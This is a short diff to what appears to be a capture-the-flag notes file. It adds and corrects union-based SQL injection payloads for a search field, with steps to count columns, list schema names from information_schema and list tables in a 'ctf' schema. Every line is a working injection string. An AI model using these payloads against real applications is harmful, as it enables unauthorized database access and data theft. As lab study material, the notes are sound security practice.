@@ -1,6 +1,8 @@
+Select example -> Search' union select 1,"name",0,"description","created_at" from products -- -
+
 Get number of columns --> Search' order by 5 -- -
 
-Get columns names --> Search' union select 1,2,3,4,5 schema_name from information_schema.schemata -- -
+Get columns names --> Search' union select 1,2,3,4,schema_name from information_schema.schemata -- -
 
 Get tables --> Search' union select 1,2,3,4,table_name from information_schema.tables where table_schema='ctf' -- -
 
